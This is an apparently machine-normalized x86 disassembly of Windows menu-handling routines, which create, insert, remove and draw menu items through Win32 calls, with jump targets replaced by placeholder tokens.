jbe r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
call sub_458d98
mov al [ eax + 0x3f ]
cmp al [ ebp - 0x1 ]
jbe r-xdata
inc [ ebp - 0x10 ]
jmp r-xdata
inc [ ebp - 0x14 ]
sub_456994
push ebx
mov ebx eax
mov eax ebx
call sub_45353c
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403540
mov edx [ eax + 0x64 ]
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x30 ]
call sub_45b94c
test al al
jne r-xdata
mov al 0x1
pop ebx
retn
sub_4569cc
push ebx
mov ebx eax
mov eax ebx
call sub_453550
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403540
mov al [ eax + 0x69 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x38 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_4569fc
push ebx
mov ebx eax
mov eax ebx
call sub_453564
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403540
mov al [ eax + 0x6a ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x39 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_456a2c
push ebx
mov ebx eax
mov eax ebx
call sub_45358c
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403540
mov eax [ eax + 0x74 ]
mov edx [ ebx + 0x18 ]
cmp eax [ edx + 0x54 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_456a5c
push ebx
mov ebx eax
mov eax ebx
call sub_4535b4
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403540
mov edx [ eax + 0x7c ]
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x58 ]
call sub_40452c
je r-xdata
mov al 0x1
pop ebx
retn
sub_456a90
push ebx
mov ebx eax
mov eax [ ebx + 0x18 ]
cmp [ eax + 0x3d ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
call sub_453578
test al al
je r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403540
mov eax [ eax + 0x6c ]
mov edx [ ebx + 0x18 ]
movzx edx [ edx + 0x3f ]
cmp eax edx
je r-xdata
mov al 0x1
pop ebx
retn
sub_456acc
push ebx
mov ebx eax
mov eax ebx
call sub_4535c8
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403540
mov eax [ eax + 0x80 ]
mov edx [ ebx + 0x18 ]
cmp eax [ edx + 0x40 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_456b00
push ebx
mov ebx eax
mov eax ebx
call sub_4535dc
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403540
mov ax [ eax + 0x84 ]
mov edx [ ebx + 0x18 ]
cmp ax [ edx + 0x60 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_456b34
push ebx
mov ebx eax
mov eax ebx
call sub_4535f0
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403540
mov al [ eax + 0x86 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x3e ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_456b68
push ebx
mov ebx eax
mov eax ebx
call sub_424398
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x88 ]
mov edx [ ebx + 0x10 ]
cmp eax [ edx + 0x40 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_456b90
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x78 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x18 ]
mov [ eax + 0xa8 ] bl
sub_456bb0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_458bf0
sub_456bd0
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_458c60
sub_456bf0
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_458cb4
sub_456c10
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov [ eax + 0x54 ] esi
sub_456c2c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x18 ]
add eax 0x58
mov edx esi
call sub_404174
sub_456c50
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_458de0
sub_456c70
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x40 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_458dbc
sub_456c90
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_458dd0
sub_456cb0
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
pop ebx
pop ebp
retn 0x8
mov eax [ ebx + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0x88 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x8c ] edx
sub_456cdc
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_423aa8
mov [ ebx + 0x3e ] 0x1
mov [ ebx + 0x39 ] 0x1
mov [ ebx + 0x3b ] 0x2
mov [ ebx + 0x3c ] 0x2
call sub_4567c8
mov [ ebx + 0x50 ] ax
mov [ ebx + 0x40 ] 0xffffffff
mov dl 0x1
mov eax [ r-xdata ]
call sub_403360
mov esi eax
mov [ ebx + 0x78 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_4596ec
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4036f4
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_40374c
pop [ fs : 0x0 ]
add esp 0xc
sub_456d58
push ebx
push esi
call sub_40375c
mov ebx edx
mov esi eax
mov edx esi
mov eax [ rw-data ]
call sub_45b730
mov eax [ esi + 0x64 ]
test eax eax
je r-xdata
mov eax esi
call sub_458d88
test eax eax
jg r-xdata
mov edx esi
call sub_459120
xor eax eax
mov [ esi + 0x64 ] eax
jmp r-xdata
xor edx edx
mov eax esi
call sub_458d98
call sub_403390
cmp [ esi + 0x34 ] 0x0
je r-xdata
mov eax [ esi + 0x5c ]
call sub_403390
lea eax [ esi + 0x44 ]
call sub_40d7a0
lea eax [ esi + 0x78 ]
call sub_40d7a0
mov ax [ esi + 0x50 ]
test ax ax
je r-xdata
xor edx edx
mov eax esi
call sub_457174
mov eax [ esi + 0x34 ]
push eax
call DestroyMenu
mov eax [ esi + 0x4c ]
test eax eax
je r-xdata
movzx edx ax
xor ecx ecx
mov eax [ rw-data ]
call sub_41bb80
mov edx ebx
and dl 0xfc
mov eax esi
call sub_423af4
test bl bl
jle r-xdata
call sub_403390
pop esi
pop ebx
retn
mov eax esi
call sub_403744
sub_456e0c
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x40 ] ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x1 ] cl
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_457067
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x3e ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45706e
lea eax [ ebp - 0x40 ]
call sub_404120
lea eax [ ebp - 0x8 ]
call sub_404120
retn
lea eax [ ebp - 0x8 ]
mov edx [ ebx + 0x30 ]
call sub_4041b8
mov eax ebx
call sub_458d88
test eax eax
jle r-xdata
cmp [ ebx + 0x60 ] 0x0
je r-xdata
mov eax ebx
call sub_45731c
mov [ ebp - 0x25 ] eax
jmp r-xdata
call GetVersion
and eax 0xff
cmp ax 0x4
jb r-xdata
mov esi [ ebx + 0x64 ]
test esi esi
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx r-xdata
call sub_40452c
sete al
and eax 0x7f
mov esi [ eax * 4 + rw-data ]
xor eax eax
mov al [ ebx + 0x48 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x38 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x39 ]
or eax [ edx * 4 + rw-data ]
or esi eax
or esi 0x400
mov eax ebx
call sub_458d88
test eax eax
jle r-xdata
mov [ ebp - 0x39 ] 0x2c
mov [ ebp - 0x35 ] 0x3f
mov eax ebx
call sub_459344
mov esi eax
test esi esi
je r-xdata
push [ ebp - 0x8 ]
push r-xdata
lea edx [ ebp - 0x40 ]
mov ax [ ebx + 0x60 ]
call sub_456470
push [ ebp - 0x40 ]
lea eax [ ebp - 0x8 ]
mov edx 0x3
call sub_4044a0
cmp [ esi + 0x64 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
call sub_4045e0
push eax
movzx eax [ ebx + 0x50 ]
push eax
push esi
push 0xffffffff
push edi
call InsertMenuA
mov eax [ ebx + 0x30 ]
call sub_4045e0
push eax
mov eax ebx
call sub_45731c
push eax
or esi 0x10
push esi
push 0xffffffff
push edi
call InsertMenuA
jmp r-xdata
cmp [ ebx + 0x4c ] 0x0
je r-xdata
cmp [ esi + 0x40 ] 0x0
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx [ r-xdata ]
call sub_40351c
test al al
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx + 0x4c ]
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
je r-xdata
mov al 0x1
mov eax ebx
call sub_458960
test eax eax
jne r-xdata
mov [ ebp - 0x9 ] al
mov eax [ ebx + 0x30 ]
mov edx r-xdata
call sub_40452c
sete al
and eax 0x7f
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x3d ]
mov edx [ edx * 4 + rw-data ]
xor ecx ecx
mov cl [ ebx + 0x48 ]
or edx [ ecx * 4 + rw-data ]
or eax edx
xor edx edx
mov dl [ ebp - 0x1 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebp - 0x9 ]
or eax [ edx * 4 + rw-data ]
mov [ ebp - 0x31 ] eax
xor eax eax
mov al [ ebx + 0x38 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x39 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x3a ]
or eax [ edx * 4 + rw-data ]
mov [ ebp - 0x2d ] eax
movzx eax [ ebx + 0x50 ]
mov [ ebp - 0x29 ] eax
xor eax eax
mov [ ebp - 0x25 ] eax
xor eax eax
mov [ ebp - 0x21 ] eax
xor eax eax
mov [ ebp - 0x1d ] eax
mov eax [ ebp - 0x8 ]
call sub_4045e0
mov [ ebp - 0x15 ] eax
mov eax ebx
call sub_458d88
test eax eax
jle r-xdata
lea eax [ ebp - 0x39 ]
push eax
push 0xffffffff
push 0xffffffff
push edi
call InsertMenuItemA
jmp r-xdata
mov eax ebx
call sub_45731c
mov [ ebp - 0x25 ] eax
sub_457087
inc [ ecx ]
add [ eax ] al
add [ 0x55000000 ] ch
mov ebp esp
mov edx [ ebp + 0x8 ]
mov cl [ edx - 0x5 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x34 ]
call sub_456e0c
xor eax eax
pop ebp
retn
sub_4570ac
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x70 ]
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x70 ]
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_40351c
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_45a980
test al al
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_459948
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_459e44
mov [ ebp - 0x5 ] al
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x68 ]
mov eax r-xdata
mov ecx [ ebp - 0x4 ]
call sub_456848
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov al 0x1
sub_45711c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_457166
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_420a84
mov eax [ ebp - 0x4 ]
call sub_4566d0
mov edx eax
mov eax ebx
call sub_458dbc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45716d
lea eax [ ebp - 0x4 ]
call sub_404120
retn
sub_457174
push ebx
mov ebx eax
test edx edx
je r-xdata
mov eax [ ebx + 0x68 ]
cmp edx eax
je r-xdata
test [ edx + 0x1c ] 0x8
jne r-xdata
pop ebx
retn
test eax eax
je r-xdata
mov eax edx
mov [ ebx + 0x68 ] eax
test eax eax
je r-xdata
xor ecx ecx
mov [ eax + 0x6c ] ecx
mov eax ebx
call sub_4571ec
mov [ eax + 0x6c ] ebx
mov edx ebx
call sub_423b78
sub_4571b0
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_423ef8
mov eax ebx
call sub_458d70
test eax eax
je r-xdata
cmp [ ebx + 0x74 ] 0x0
je r-xdata
mov eax ebx
call sub_458d70
mov edx eax
mov cl 0x1
mov eax ebx
mov si 0xffef
call sub_40358c
pop esi
pop ebx
retn
mov eax ebx
call sub_4571ec
sub_4571ec
push ebx
push esi
push edi
push ebp
mov ebp eax
test [ ebp + 0x1c ] 0x8
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
test [ ebp + 0x1c ] 0x2
je r-xdata
mov eax [ ebp + 0x6c ]
test eax eax
je r-xdata
mov [ ebp + 0x74 ] 0x1
jmp r-xdata
mov eax ebp
call sub_45731c
push eax
call GetMenuItemCount
mov esi eax
test esi esi
sete bl
test esi esi
jle r-xdata
call sub_4571ec
jmp r-xdata
test bl bl
je r-xdata
push 0x400
mov edi esi
dec edi
push edi
mov eax ebp
call sub_45731c
push eax
call GetMenuState
test al 0x4
jne r-xdata
cmp [ ebp + 0x64 ] 0x0
jne r-xdata
dec esi
test esi esi
jg r-xdata
push 0x400
push edi
mov eax ebp
call sub_45731c
push eax
call RemoveMenu
mov bl 0x1
mov eax ebp
call sub_4570ac
mov eax [ ebp + 0x70 ]
mov edx [ r-xdata ]
call sub_40351c
test al al
je r-xdata
mov eax ebp
call sub_45731c
push eax
call GetMenuItemCount
test eax eax
jne r-xdata
mov eax [ ebp + 0x34 ]
push eax
call DestroyMenu
xor eax eax
mov [ ebp + 0x34 ] eax
jmp r-xdata
xor edx edx
mov eax ebp
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_4572bc
push ebx
push esi
push edi
push ebp
push ecx
mov ebx ecx
mov [ esp ] edx
mov edi eax
mov eax edi
call sub_458d88
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebp ebp
mov edx ebp
mov eax edi
call sub_458d98
cmp bl [ eax + 0x3f ]
jbe r-xdata
mov edx ebp
mov eax edi
call sub_458d98
cmp bl [ eax + 0x3f ]
jae r-xdata
inc ebp
dec esi
jne r-xdata
mov edx ebp
mov eax edi
call sub_458d98
mov [ eax + 0x3f ] bl
mov eax [ rw-data ]
call sub_4563c4
jmp r-xdata
cmp ebp [ esp ]
jge r-xdata
sub_45731c
push ebx
mov ebx eax
cmp [ ebx + 0x34 ] 0x0
jne r-xdata
mov eax [ ebx + 0x34 ]
pop ebx
retn
mov eax [ ebx + 0x4 ]
mov edx [ r-xdata ]
call sub_40351c
test al al
je r-xdata
call CreateMenu
mov [ ebx + 0x34 ] eax
call CreatePopupMenu
mov [ ebx + 0x34 ] eax
jmp r-xdata
mov eax ebx
call sub_4570ac
mov eax [ rw-data ]
call sub_4563c4
cmp [ ebx + 0x34 ] 0x0
jne r-xdata
sub_457368
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_423e20
push ebx
push sub_45711c
push 0x0
push 0x0
xor ecx ecx
mov edx r-xdata
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop esi
pop ebx
retn
sub_4573ac
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov ebx [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_457590
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_459344
mov edi eax
test edi edi
je r-xdata
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
call sub_4041b8
test bh 0x4
je r-xdata
mov eax edi
call sub_45a980
test al al
je r-xdata
mov eax [ ebp - 0xc ]
mov edx r-xdata
call sub_40452c
jne r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
test bl 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov dl 0x1
call sub_427724
cmp [ esi + 0x3a ] 0x0
je r-xdata
test bh 0x4
jne r-xdata
lea eax [ ebp - 0xc ]
mov edx r-xdata
call sub_4043e8
mov eax [ ebp - 0xc ]
cmp [ eax ] 0x26
jne r-xdata
mov eax ebx
and eax 0x2
cmp eax 0x2
jne r-xdata
and ebx 0xffffffff
or ebx 0x2
jmp r-xdata
cmp [ esi + 0x39 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edi [ eax + 0xc ]
mov eax edi
call sub_4270fc
mov edx eax
or dl [ r-xdata ]
mov eax edi
call sub_427108
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_457597
lea eax [ ebp - 0xc ]
call sub_404120
retn
mov eax [ ebp + 0x10 ]
mov esi eax
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
add [ ebp - 0x18 ] 0x4
push 0x2
push 0x6
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_427d50
push eax
call DrawEdge
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x1 ] 0x0
jne r-xdata
or ebx 0x20000
and ebx 0xfffffffd
or ebx 0x0
push ebx
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp - 0xc ]
call sub_4043e0
push eax
mov eax [ ebp - 0xc ]
call sub_4045e0
push eax
mov eax [ ebp - 0x4 ]
call sub_427d50
push eax
call DrawTextA
cmp [ ebp + 0xc ] 0x0
jne r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
push 0x1
push 0x1
mov eax [ ebp + 0x10 ]
push eax
call OffsetRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov edx 0xff000014
call sub_426e3c
push ebx
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp - 0xc ]
call sub_4043e0
push eax
mov eax [ ebp - 0xc ]
call sub_4045e0
push eax
mov eax [ ebp - 0x4 ]
call sub_427d50
push eax
call DrawTextA
push 0xffffffff
push 0xffffffff
mov eax [ ebp + 0x10 ]
push eax
call OffsetRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov edx 0xff000010
call sub_426e3c
mov eax 0xff00000d
call sub_42697c
mov esi eax
mov eax 0xff000010
call sub_42697c
cmp esi eax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov edx 0xff000014
call sub_426e3c
jmp r-xdata
sub_4575fc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_457ee4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_4279ac
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001d
call sub_427608
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov edx 0xff00000e
call sub_426e3c
jmp r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
mov edx [ r-xdata ]
call sub_40351c
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x30 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
mov al [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x31 ] al
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x20 ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x30 ]
mov edx r-xdata
call sub_40452c
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001e
call sub_427608
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x40 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_4279ac
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax - 0x10 ] edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0x8 ] 0xfffffffc
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x0
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
add [ eax - 0x8 ] 0x2
mov eax [ ebp + 0x8 ]
add [ eax - 0x4 ] 0x2
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx - 0x41 ] al
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_4543c0
cmp ebx eax
jl r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x4c ]
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov esi [ eax + 0x4c ]
test esi esi
je r-xdata
mov al 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
push 0xf
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
movzx eax [ eax + 0x38 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xfffffff0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_427d50
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
add eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
add eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x40 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x10 ]
lea edi [ edx - 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
inc [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_427600
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov eax [ ebp + 0x8 ]
